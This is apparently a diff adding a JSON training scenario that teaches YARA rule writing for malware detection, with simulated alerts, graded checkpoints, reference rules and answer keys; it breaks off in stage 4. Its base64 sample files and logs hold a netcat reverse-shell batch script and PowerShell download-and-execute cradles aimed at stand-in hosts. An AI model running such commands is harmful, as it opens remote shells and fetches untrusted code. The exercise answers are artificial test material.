@@ -1,0 +1,707 @@
+{
+  "name": "YARA Rule Writing — Threat Detection with Pattern Matching",
+  "description": "Learn to write YARA rules for malware detection. Progress from basic string matching through hex patterns, conditions, regex, and real-world malware detection. Each stage provides sample files to test your rules against interactively.",
+  "difficulty": "INTERMEDIATE",
+  "category": "Threat Detection",
+  "mitreAttackIds": ["T1059.001", "T1027", "T1105", "T1036", "T1547.001"],
+  "briefing": "## YARA Rule Writing Training\n\nIn this scenario, you will learn to write **YARA rules** — the industry-standard tool for identifying and classifying malware samples.\n\nYou'll progress through 5 stages:\n\n1. **Basic String Matching** — Find malicious strings in files\n2. **Hex Patterns & Wildcards** — Match byte-level patterns with wildcards\n3. **Conditions & Boolean Logic** — Combine multiple conditions\n4. **Regular Expressions** — Use regex and string modifiers\n5. **Real-World Malware Detection** — Apply all techniques to detect an APT dropper\n\nFor each stage, you'll see **sample files** with previews of their contents. Write a YARA rule that **matches the malicious samples** and **does NOT match the benign ones**.\n\nUse the **Test Rule** button to check your rule before submitting!\n\n**Tip:** Start simple. Get the rule compiling first, then refine it to improve accuracy.",
+  "lessonContent": "# YARA Rule Writing — Pre-Investigation Lesson\n\nBefore you begin writing rules, let's review YARA fundamentals.\n\n---\n\n## 1. What is YARA?\n\nYARA is a tool aimed at helping malware researchers to **identify and classify malware samples**. It's often called \"the pattern matching Swiss knife for security researchers.\"\n\nSOC analysts use YARA to:\n- Scan endpoints for known malware patterns\n- Classify samples submitted to sandboxes\n- Create detection signatures from threat intelligence\n- Hunt for indicators of compromise across file shares\n\n---\n\n## 2. YARA Rule Structure\n\nEvery YARA rule follows this structure:\n\n```\nrule rule_name {\n    meta:\n        author = \"analyst\"\n        description = \"What this rule detects\"\n\n    strings:\n        $s1 = \"text string\"\n        $h1 = { 4D 5A 90 00 }\n        $r1 = /regex[0-9]+pattern/\n\n    condition:\n        any of them\n}\n```\n\n### Sections:\n- **meta** — Metadata about the rule (informational only, not used in matching)\n- **strings** — Patterns to search for in files\n- **condition** — Boolean expression that determines when the rule matches\n\n---\n\n## 3. String Types\n\n### Text Strings\n```\n$s1 = \"malware\"\n$s2 = \"cmd.exe /c\" nocase\n$s3 = \"powershell\" ascii wide\n```\n- `nocase` — Case-insensitive matching\n- `ascii` — Match ASCII encoding (default)\n- `wide` — Match UTF-16LE encoding (common in Windows)\n- `fullword` — Only match whole words\n\n### Hex Strings (Byte Patterns)\n```\n$h1 = { 4D 5A 90 00 }           // Exact bytes\n$h2 = { 4D 5A ?? ?? 00 }        // ?? = any byte (wildcard)\n$h3 = { 4D 5A [2-4] 00 }        // [2-4] = 2 to 4 bytes (jump)\n$h4 = { 4D 5A ( 90 00 | 00 00 ) } // Alternation\n```\n\n### Regular Expressions\n```\n$r1 = /https?:\\/\\/[a-z0-9\\-]+\\.[a-z]{2,}/\n$r2 = /[A-Za-z0-9+\\/]{40,}={0,2}/     // Base64\n```\n\n---\n\n## 4. Conditions\n\n### Basic Conditions\n```\ncondition:\n    $s1                    // String $s1 must be present\n    $s1 and $s2            // Both must be present\n    $s1 or $s2             // Either must be present\n    any of ($s*)           // Any string starting with $s\n    all of them            // All defined strings\n    2 of ($s1, $s2, $s3)   // At least 2 of the listed strings\n```\n\n### File Properties\n```\ncondition:\n    filesize < 1MB\n    filesize > 100 and filesize < 500KB\n    uint16(0) == 0x5A4D         // MZ header (PE file)\n    uint32be(0) == 0x7F454C46   // ELF header\n```\n\n### Counting Occurrences\n```\ncondition:\n    #s1 > 3              // String $s1 appears more than 3 times\n    #s1 == 2             // Exactly 2 occurrences\n```\n\n### String Offsets\n```\ncondition:\n    $s1 at 0             // String must be at offset 0\n    $s1 in (0..100)      // String in first 100 bytes\n```\n\n---\n\n## 5. Best Practices\n\n1. **Be specific** — Avoid matching on common strings like \"http\" alone\n2. **Combine conditions** — Use multiple strings + file properties to reduce false positives\n3. **Test against benign files** — A rule that matches everything is useless\n4. **Use meaningful names** — `rule APT29_Dropper_v2` not `rule test123`\n5. **Document with meta** — Future you (and your team) will thank you\n\n---\n\n## Ready?\n\nClick **Continue to Investigation** to start writing YARA rules. Each stage gives you sample files and asks you to write a rule that correctly classifies them. Use the **Test Rule** button to iterate before submitting!",
+  "estimatedMinutes": 45,
+  "isActive": true,
+  "stages": [
+    {
+      "stageNumber": 1,
+      "title": "Basic String Matching",
+      "description": "Write a YARA rule using basic ASCII text strings to detect a simple malicious script. Look at the sample files and find strings unique to the malicious one.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Alert — Threat Intel feed received new IOC: a batch script dropping a reverse shell. Known strings include 'nc.exe -e cmd.exe' and a callback to '198.51.100.77'.",
+          "rawLog": {
+            "alertId": "TI-2025-0901",
+            "ruleName": "Threat Intel IOC Import",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T14:00:00Z",
+            "description": "Threat intelligence feed delivered new indicator: batch script containing reverse shell command. Indicator shared by partner CERT. Script uses netcat to establish reverse connection.",
+            "iocType": "file_hash",
+            "iocValue": "d41d8cd98f00b204e9800998ecf8427e",
+            "source": "Partner CERT Feed",
+            "tags": ["reverse-shell", "batch-script", "netcat"]
+          },
+          "severity": "HIGH",
+          "hostname": "SIEM-01",
+          "timestamp": "2025-06-10T14:00:00Z",
+          "isEvidence": true,
+          "evidenceTag": "threat-intel-ioc",
+          "sortOrder": 1
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Suspicious batch file detected on WS-DEV02. File 'update.bat' contains networking commands and shell execution patterns.",
+          "rawLog": {
+            "alertId": "EDR-2025-1447",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T14:15:22Z",
+            "hostname": "WS-DEV02",
+            "username": "d.wilson",
+            "processName": "cmd.exe",
+            "processPath": "C:\\Windows\\System32\\cmd.exe",
+            "commandLine": "cmd.exe /c update.bat",
+            "parentProcess": "explorer.exe",
+            "alertType": "Suspicious Script Execution",
+            "filePath": "C:\\Users\\d.wilson\\Downloads\\update.bat",
+            "fileHash": "d41d8cd98f00b204e9800998ecf8427e"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-DEV02",
+          "username": "d.wilson",
+          "processName": "cmd.exe",
+          "timestamp": "2025-06-10T14:15:22Z",
+          "isEvidence": true,
+          "evidenceTag": "suspicious-batch-execution",
+          "sortOrder": 2
+        }
+      ],
+      "hints": [
+        {
+          "content": "Look for strings that appear in the malicious sample but NOT in the benign one. The reverse shell command and the IP address are good candidates.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Try: $s1 = \"nc.exe -e cmd.exe\" and $s2 = \"198.51.100.77\" with condition: all of them",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ],
+      "checkpoints": [
+        {
+          "checkpointType": "YARA_RULE",
+          "question": "Write a YARA rule that matches the malicious batch script (malicious_update.bat) but does NOT match the legitimate script (legit_update.bat). Look at the sample previews for clues about what strings to match on.",
+          "options": null,
+          "correctAnswer": {
+            "samples": [
+              {
+                "name": "malicious_update.bat",
+                "content": "QGVjaG8gb2ZmDQpjb3B5IG5jLmV4ZSAlVEVNUCVcbmMuZXhlDQolVEVNUCVcbmMuZXhlIC1lIGNtZC5leGUgMTk4LjUxLjEwMC43NyA0NDQzDQpkZWwgJVRFTVAlXG5jLmV4ZQ0KZWNobyBVcGRhdGUgY29tcGxldGUu",
+                "shouldMatch": true,
+                "description": "Batch script that copies netcat, opens a reverse shell to 198.51.100.77:4443, then cleans up.",
+                "previewStrings": ["nc.exe -e cmd.exe", "198.51.100.77", "del %TEMP%\\nc.exe", "@echo off"],
+                "previewHex": "40 65 63 68 6F 20 6F 66 66"
+              },
+              {
+                "name": "legit_update.bat",
+                "content": "QGVjaG8gb2ZmDQplY2hvIENoZWNraW5nIGZvciB1cGRhdGVzLi4uDQpwaW5nIC1uIDEgdXBkYXRlLmNvcnAubG9jYWwgPiBudWwNCmVjaG8gVXBkYXRlIGNoZWNrIGNvbXBsZXRlLg==",
+                "shouldMatch": false,
+                "description": "Legitimate update-check script that pings the corporate update server.",
+                "previewStrings": ["@echo off", "Checking for updates...", "ping -n 1 update.corp.local", "Update check complete."]
+              }
+            ],
+            "referenceRule": "rule detect_reverse_shell_bat {\n    strings:\n        $s1 = \"nc.exe -e cmd.exe\"\n        $s2 = \"198.51.100.77\"\n    condition:\n        all of them\n}"
+          },
+          "points": 15,
+          "category": "accuracy",
+          "explanation": "The malicious script contains 'nc.exe -e cmd.exe' (netcat reverse shell) and the C2 IP '198.51.100.77'. These strings don't appear in the legitimate update script, making them reliable detection signatures.",
+          "sortOrder": 1
+        },
+        {
+          "checkpointType": "MULTIPLE_CHOICE",
+          "question": "Which YARA string modifier would you use to match 'PowerShell' regardless of whether it appears as 'POWERSHELL', 'powershell', or 'PowerShell'?",
+          "options": ["wide", "nocase", "fullword", "ascii"],
+          "correctAnswer": "nocase",
+          "points": 5,
+          "category": "accuracy",
+          "explanation": "The 'nocase' modifier makes the string match case-insensitive. 'wide' matches UTF-16LE encoding, 'fullword' requires word boundaries, and 'ascii' is the default encoding.",
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 2,
+      "title": "Hex Patterns & Wildcards",
+      "description": "Write a YARA rule using hexadecimal byte patterns with wildcards (??) and jumps ([n-m]) to detect a PE file with a suspicious embedded payload marker.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Suspicious PE file detected with non-standard section name and embedded marker bytes. File appears to be a dropper that extracts a payload at runtime.",
+          "rawLog": {
+            "alertId": "EDR-2025-1523",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T15:30:00Z",
+            "hostname": "WS-FIN01",
+            "username": "a.martinez",
+            "processName": "suspicious.exe",
+            "processPath": "C:\\Users\\a.martinez\\AppData\\Local\\Temp\\suspicious.exe",
+            "alertType": "Suspicious PE Structure",
+            "description": "PE file with unusual section .xdata containing marker bytes 0xDEADBEEF followed by XOR-encoded payload",
+            "mitreTactic": "Defense Evasion",
+            "mitreTechnique": "T1027"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-FIN01",
+          "username": "a.martinez",
+          "processName": "suspicious.exe",
+          "timestamp": "2025-06-10T15:30:00Z",
+          "isEvidence": true,
+          "evidenceTag": "suspicious-pe-dropper",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation — The file hash matches a known dropper family that uses 0xDEADBEEF as a payload start marker followed by a 2-byte XOR key.",
+          "rawLog": {
+            "alertId": "SIEM-2025-0334",
+            "ruleName": "Known Dropper Family Detection",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T15:32:00Z",
+            "description": "File structure analysis: MZ header present, contains byte sequence DE AD BE EF followed by 2-byte XOR key, then encoded payload. Dropper family: PHANTOMPAYLOAD.",
+            "correlatedEvents": ["EDR-2025-1523"],
+            "tags": ["dropper", "PHANTOMPAYLOAD", "xor-encoded"]
+          },
+          "severity": "HIGH",
+          "hostname": "SIEM-01",
+          "timestamp": "2025-06-10T15:32:00Z",
+          "isEvidence": true,
+          "evidenceTag": "dropper-family-match",
+          "sortOrder": 2
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow — suspicious.exe initiated an outbound connection to 203.0.113.42 on port 8443 shortly after execution.",
+          "rawLog": {
+            "srcIp": "10.0.2.15",
+            "srcPort": 49721,
+            "dstIp": "203.0.113.42",
+            "dstPort": 8443,
+            "protocol": "TCP",
+            "bytesOut": 1245,
+            "bytesIn": 58320,
+            "duration": 12,
+            "timestamp": "2025-06-10T15:31:15Z",
+            "hostname": "WS-FIN01",
+            "processName": "suspicious.exe"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-FIN01",
+          "sourceIp": "10.0.2.15",
+          "destIp": "203.0.113.42",
+          "processName": "suspicious.exe",
+          "timestamp": "2025-06-10T15:31:15Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-callback",
+          "sortOrder": 3
+        }
+      ],
+      "hints": [
+        {
+          "content": "Use a hex string to match the MZ header: { 4D 5A } and another for the payload marker: { DE AD BE EF }. Wildcards (??) can match the variable XOR key bytes.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Try: $mz = { 4D 5A } and $marker = { DE AD BE EF ?? ?? } with condition: $mz at 0 and $marker",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ],
+      "checkpoints": [
+        {
+          "checkpointType": "YARA_RULE",
+          "question": "Write a YARA rule that detects PE files (MZ header) containing the DEADBEEF payload marker. The marker is followed by a 2-byte XOR key (variable). Use hex patterns with wildcards.",
+          "options": null,
+          "correctAnswer": {
+            "samples": [
+              {
+                "name": "dropper.exe",
+                "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABERUFEQkVFRkFCAAAAAAAAAAAAAABQSEFOVE9NUEFZTE9BRAAAAAAAAAAAAHsiaG9zdCI6IjIwMy4wLjExMy40MiIsInBvcnQiOjg0NDN9",
+                "shouldMatch": true,
+                "description": "PE dropper with MZ header and DEADBEEF payload marker followed by 2-byte XOR key.",
+                "previewStrings": ["PHANTOMPAYLOAD"],
+                "previewHex": "4D 5A 90 00 ... DE AD BE EF ?? ??"
+              },
+              {
+                "name": "legit_tool.exe",
+                "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABIZWxsbywgdGhpcyBpcyBhIGxlZ2l0aW1hdGUgdG9vbC4gTm8gbWFsaWNpb3VzIHBheWxvYWQgaGVyZS4=",
+                "shouldMatch": false,
+                "description": "Legitimate PE tool with MZ header but no DEADBEEF marker.",
+                "previewStrings": ["Hello, this is a legitimate tool."],
+                "previewHex": "4D 5A 90 00 ..."
+              },
+              {
+                "name": "readme.txt",
+                "content": "VGhpcyBpcyBhIHBsYWluIHRleHQgUkVBRE1FIGZpbGUuIEl0IGRvZXMgbm90IGhhdmUgYW4gTVogaGVhZGVyIG9yIGFueSBtYWxpY2lvdXMgY29udGVudC4=",
+                "shouldMatch": false,
+                "description": "Plain text README file — no PE header, no malicious content.",
+                "previewStrings": ["This is a plain text README file."]
+              }
+            ],
+            "referenceRule": "rule PHANTOMPAYLOAD_dropper {\n    strings:\n        $mz = { 4D 5A }\n        $marker = { DE AD BE EF ?? ?? }\n    condition:\n        $mz at 0 and $marker\n}"
+          },
+          "points": 20,
+          "category": "accuracy",
+          "explanation": "The MZ header (4D 5A) identifies PE files, and the DEADBEEF marker with wildcard bytes for the XOR key identifies this specific dropper family. Combining '$mz at 0' with '$marker' ensures we only match PE files with the payload marker.",
+          "sortOrder": 1
+        },
+        {
+          "checkpointType": "TRUE_FALSE",
+          "question": "In YARA hex strings, the pattern { 4D 5A [2-4] 90 } means: match 4D 5A, then exactly 2 to 4 arbitrary bytes, then 90.",
+          "options": ["true", "false"],
+          "correctAnswer": "true",
+          "points": 5,
+          "category": "accuracy",
+          "explanation": "The jump notation [n-m] in YARA hex strings means 'match n to m arbitrary bytes'. So { 4D 5A [2-4] 90 } matches 4D 5A followed by 2, 3, or 4 bytes of any value, followed by 90.",
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 3,
+      "title": "Conditions & Boolean Logic",
+      "description": "Write a YARA rule that uses multiple string conditions, filesize checks, and boolean logic to detect a PowerShell-based downloader while avoiding false positives on legitimate scripts.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — PowerShell process launched with encoded command, downloading a payload from a suspicious URL using System.Net.WebClient.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-06-10T16:45:00Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAuAGIAYQBkAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "User": "CORP\\d.wilson",
+            "Hashes": "SHA256=abc123"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-DEV02",
+          "username": "d.wilson",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-06-10T16:45:00Z",
+          "isEvidence": true,
+          "evidenceTag": "encoded-powershell-downloader",
+          "sortOrder": 1
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Malicious PowerShell script detected. Script uses DownloadString, Invoke-Expression, and hidden window mode — classic downloader pattern.",
+          "rawLog": {
+            "alertId": "EDR-2025-1598",
+            "severity": "CRITICAL",
+            "timestamp": "2025-06-10T16:45:30Z",
+            "hostname": "WS-DEV02",
+            "username": "d.wilson",
+            "processName": "powershell.exe",
+            "alertType": "Malicious PowerShell Downloader",
+            "description": "Script combines: (1) -nop -w hidden flags, (2) Net.WebClient, (3) DownloadString, (4) iex/Invoke-Expression. High confidence malicious.",
+            "mitreTactic": "Execution",
+            "mitreTechnique": "T1059.001"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-DEV02",
+          "username": "d.wilson",
+          "processName": "powershell.exe",
+          "timestamp": "2025-06-10T16:45:30Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-ps-downloader",
+          "sortOrder": 2
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation — Multiple PowerShell scripts collected from recent incidents. Analysis shows malicious scripts are typically under 5KB and contain at least 2 of: DownloadString, WebClient, -enc, Invoke-Expression.",
+          "rawLog": {
+            "alertId": "SIEM-2025-0412",
+            "ruleName": "PowerShell Downloader Pattern",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T16:50:00Z",
+            "description": "Analysis of collected PS1 scripts: malicious downloaders typically under 5KB, contain combination of Net.WebClient + DownloadString + Invoke-Expression/iex. Legitimate admin scripts often larger and use different cmdlets.",
+            "tags": ["powershell", "downloader", "cradle"]
+          },
+          "severity": "HIGH",
+          "hostname": "SIEM-01",
+          "timestamp": "2025-06-10T16:50:00Z",
+          "isEvidence": true,
+          "evidenceTag": "siem-ps-analysis",
+          "sortOrder": 3
+        }
+      ],
+      "hints": [
+        {
+          "content": "Define multiple strings for the suspicious indicators: 'DownloadString', 'Net.WebClient', 'Invoke-Expression', '-enc'. Then use '2 of ($s*)' or 'any of them' in the condition.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Add a filesize check: 'filesize < 5KB' helps exclude large legitimate scripts. Combine with '2 of ($s*)' for better accuracy.",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ],
+      "checkpoints": [
+        {
+          "checkpointType": "YARA_RULE",
+          "question": "Write a YARA rule to detect PowerShell downloader scripts. Malicious samples contain combinations of 'DownloadString', 'Net.WebClient', 'Invoke-Expression', and '-enc'. Use boolean logic and consider filesize constraints to avoid false positives.",
+          "options": null,
+          "correctAnswer": {
+            "samples": [
+              {
+                "name": "downloader.ps1",
+                "content": "aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsd2FyZS5iYWQvcGF5bG9hZC5wczEnKQ==",
+                "shouldMatch": true,
+                "description": "Malicious PowerShell downloader: uses Net.WebClient and DownloadString to fetch and execute remote payload.",
+                "previewStrings": ["Net.WebClient", "DownloadString", "iex", "malware.bad"]
+              },
+              {
+                "name": "encoded_cradle.ps1",
+                "content": "cG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWVuYyBhV1Y0SUNod1lYbHNiMkZrS1E9PQ==",
+                "shouldMatch": true,
+                "description": "Encoded PowerShell cradle with -nop -w hidden -enc flags — classic obfuscated downloader.",
+                "previewStrings": ["powershell.exe", "-nop", "-w hidden", "-enc"]
+              },
+              {
+                "name": "legit_admin.ps1",
+                "content": "IyBMZWdpdGltYXRlIGFkbWluIHNjcmlwdA0KIyBUaGlzIHNjcmlwdCBjb2xsZWN0cyBzeXN0ZW0gaW5mb3JtYXRpb24gZm9yIElUIGF1ZGl0DQoNCiRjb21wdXRlck5hbWUgPSAkZW52OkNPTVBVVEVSTkFNRQ0KJG9zVmVyc2lvbiA9IChHZXQtV21pT2JqZWN0IFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbg0KJG1lbW9yeSA9IChHZXQtV21pT2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtKS5Ub3RhbFBoeXNpY2FsTWVtb3J5DQokZGlza1NwYWNlID0gR2V0LVdtaU9iamVjdCBXaW4zMl9Mb2dpY2FsRGlzayAtRmlsdGVyICJEcml2ZVR5cGU9MyIgfCBTZWxlY3QtT2JqZWN0IERldmljZUlELCBTaXplLCBGcmVlU3BhY2UNCg0KV3JpdGUtSG9zdCAiQ29tcHV0ZXI6ICRjb21wdXRlck5hbWUiDQpXcml0ZS1Ib3N0ICJPUzogJG9zVmVyc2lvbiINCldyaXRlLUhvc3QgIk1lbW9yeTogJChbTWF0aF06OlJvdW5kKCRtZW1vcnkvMUdCLCAyKSkgR0Ii",
+                "shouldMatch": false,
+                "description": "Legitimate IT admin script that collects system information using standard WMI cmdlets. Larger than typical downloaders.",
+                "previewStrings": ["Get-WmiObject", "Win32_OperatingSystem", "ComputerName", "Write-Host"]
+              }
+            ],
+            "referenceRule": "rule PS_Downloader {\n    strings:\n        $s1 = \"DownloadString\" nocase\n        $s2 = \"Net.WebClient\" nocase\n        $s3 = \"Invoke-Expression\" nocase\n        $s4 = \"-enc\" nocase\n        $s5 = \"iex\" nocase\n    condition:\n        filesize < 5KB and 2 of ($s*)\n}"
+          },
+          "points": 20,
+          "category": "accuracy",
+          "explanation": "Combining multiple indicator strings with '2 of ($s*)' ensures the rule fires only when at least 2 suspicious patterns are present. The filesize check (< 5KB) helps exclude large legitimate scripts that might coincidentally contain one of these strings.",
+          "sortOrder": 1
+        },
+        {
+          "checkpointType": "MULTIPLE_CHOICE",
+          "question": "What does the YARA condition '2 of ($s*)' mean?",
+          "options": [
+            "Exactly 2 strings whose names start with $s must be present",
+            "At least 2 strings whose names start with $s must be present",
+            "The string $s must appear at least 2 times",
+            "2 bytes of the string $s must match"
+          ],
+          "correctAnswer": "At least 2 strings whose names start with $s must be present",
+          "points": 5,
+          "category": "accuracy",
+          "explanation": "The 'N of' operator in YARA means 'at least N of the specified strings must be present'. The ($s*) wildcard selects all string identifiers starting with $s. So '2 of ($s*)' means at least 2 of the $s-prefixed strings must be found in the file.",
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 4,
+      "title": "Regular Expressions & String Modifiers",
+      "description": "Write a YARA rule using regular expressions and string modifiers (nocase, wide, ascii) to detect a malware sample that uses obfuscated URLs and wide-character strings.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Malware sample uses wide (UTF-16) strings for C2 URLs and registry paths. Obfuscated URLs follow a pattern: http(s)://[random subdomain].badactor[number].com/[path].",
+          "rawLog": {
+            "alertId": "EDR-2025-1677",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T17:30:00Z",
+            "hostname": "WS-EXEC01",
+            "username": "c.thompson",
+            "processName": "svchost32.exe",
+            "alertType": "Suspicious String Patterns",
+            "description": "Binary contains wide-char strings for C2 communication. URL pattern: https://[a-z]{4,8}[0-9]{1,3}.badactor[0-9]{1,2}.com/gate. Also contains wide-char registry key path for persistence.",
+            "mitreTechnique": "T1547.001"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "c.thompson",
+          "processName": "svchost32.exe",
+          "timestamp": "2025-06-10T17:30:00Z",
+          "isEvidence": true,
+          "evidenceTag": "wide-string-c2",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Alert — Malware family 'WIDEGATE' uses wide-character encoding to evade basic string scanning. C2 URLs match pattern: badactor[digit].com. Persistence via Run registry key.",
+          "rawLog": {
+            "alertId": "SIEM-2025-0498",
+            "ruleName": "WIDEGATE Malware Family",
+            "severity": "HIGH",
+            "timestamp": "2025-06-10T17:35:00Z",
+            "description": "WIDEGATE family indicators: (1) Wide-char C2 URLs matching badactor pattern, (2) Registry Run key persistence with wide strings, (3) Mutex name 'WIDEGATE_MTX'. All string indicators stored as UTF-16LE in binary.",
+            "tags": ["WIDEGATE", "wide-strings", "c2", "persistence"]
+          },
+          "severity": "HIGH",
+          "hostname": "SIEM-01",
+          "timestamp": "2025-06-10T17:35:00Z",
+          "isEvidence": true,
+          "evidenceTag": "widegate-intel",
+          "sortOrder": 2
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Security Event 4688 — Process svchost32.exe (note: NOT the legitimate svchost.exe) created under user c.thompson's context. Masquerading as a system process.",
+          "rawLog": {
+            "EventID": 4688,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-06-10T17:29:45Z",
+            "Computer": "WS-EXEC01.corp.local",
+            "NewProcessName": "C:\\Users\\c.thompson\\AppData\\Local\\Temp\\svchost32.exe",
+            "CommandLine": "svchost32.exe",
+            "ParentProcessName": "C:\\Windows\\explorer.exe",
+            "SubjectUserName": "c.thompson",
+            "TokenElevationType": "%%1936"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "c.thompson",
+          "processName": "svchost32.exe",
+          "eventId": "4688",
+          "timestamp": "2025-06-10T17:29:45Z",
+          "isEvidence": true,
+          "evidenceTag": "masquerading-process",
+          "sortOrder": 3
+        }
+      ],
+      "hints": [
+        {
+          "content": "Use the 'wide' modifier to match UTF-16LE strings. For the URL pattern, use a regex like /badactor[0-9]{1,2}\\.com/. Combine with a wide-char string for the registry path.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Try: $url = /badactor[0-9]{1,2}\\.com/ and $reg = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" wide and $mutex = \"WIDEGATE_MTX\" with condition: $url and ($reg or $mutex)",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ],
+      "checkpoints": [
+        {
+          "checkpointType": "YARA_RULE",
+          "question": "Write a YARA rule to detect the WIDEGATE malware family. It uses: (1) C2 URLs matching the pattern 'badactor' followed by digits and '.com', (2) wide-character registry Run key path for persistence, (3) the mutex name 'WIDEGATE_MTX'. Use regex for URLs and the 'wide' modifier for encoded strings.",
+          "options": null,
+          "correctAnswer": {
+            "samples": [
+              {
+                "name": "widegate_sample.bin",
+                "content": "TVqQAAMAAAAEAAAAYgBhAGQAYQBjAHQAbwByADMALgBjAG8AbQAvAGcAYQB0AGUAAABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAAAFdJREVHQVRFX01UWA==",
+                "shouldMatch": true,
+                "description": "WIDEGATE malware binary: contains wide-char C2 URL (badactor3.com), wide-char registry Run key, and WIDEGATE_MTX mutex.",
+                "previewStrings": ["WIDEGATE_MTX"],
+                "previewHex": "62 00 61 00 64 00 61 00 63 00 74 00 6F 00 72 00 33 00 2E 00 63 00 6F 00 6D 00"
+              },
+              {
+                "name": "widegate_variant.bin",
+                "content": "TVqQAAMAAAAEAAAAYgBhAGQAYQBjAHQAbwByADEAMgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAAAFdJREVHQVRFX01UWAAAAFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg==",
+                "shouldMatch": true,
+                "description": "WIDEGATE variant: different C2 subdomain (badactor12.com), contains mutex and ASCII registry path.",
+                "previewStrings": ["WIDEGATE_MTX", "badactor12.com"],
+                "previewHex": "62 00 61 00 64 00 61 00 63 00 74 00 6F 00 72 00 31 00 32 00"
+              },
+              {
+                "name": "legit_svchost.exe",
+                "content": "TVqQAAMAAAAEAAAAV2luZG93cyBTZXJ2aWNlIEhvc3QgUHJvY2VzcwBTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvbg==",
+                "shouldMatch": false,
+                "description": "Legitimate Windows binary with standard registry paths. No badactor URLs or WIDEGATE mutex.",
+                "previewStrings": ["Windows Service Host Process", "Software\\Microsoft\\Windows NT\\CurrentVersion"]
+              }
+            ],
+            "referenceRule": "rule WIDEGATE_malware {\n    strings:\n        $url = /badactor[0-9]{1,2}\\.com/\n        $reg = \"CurrentVersion\\\\Run\" wide ascii\n        $mutex = \"WIDEGATE_MTX\"\n    condition:\n        $url and ($reg or $mutex)\n}"
+          },
+          "points": 20,
+          "category": "accuracy",
+          "explanation": "The regex /badactor[0-9]{1,2}\\.com/ matches the variable C2 domain pattern. Using 'wide ascii' on the registry key matches both encoding variants. The mutex provides an additional high-confidence indicator. Requiring $url AND ($reg or $mutex) ensures we match the malware family while avoiding false positives.",
+          "sortOrder": 1
+        },
+        {
